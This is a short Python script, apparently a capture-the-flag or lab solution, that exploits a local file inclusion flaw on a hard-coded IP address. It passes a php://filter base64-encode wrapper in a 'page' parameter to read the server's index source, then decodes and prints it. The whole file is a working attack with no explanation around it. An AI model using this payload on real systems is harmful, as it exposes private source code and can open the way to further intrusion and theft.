import requests
import base64

url = "http://3.112.30.17/"

parm = {
    "page": "php://filter/read=convert.base64-encode/resource=index"
}
res = requests.get(url, params=parm)
print(base64.b64decode(res.text).decode())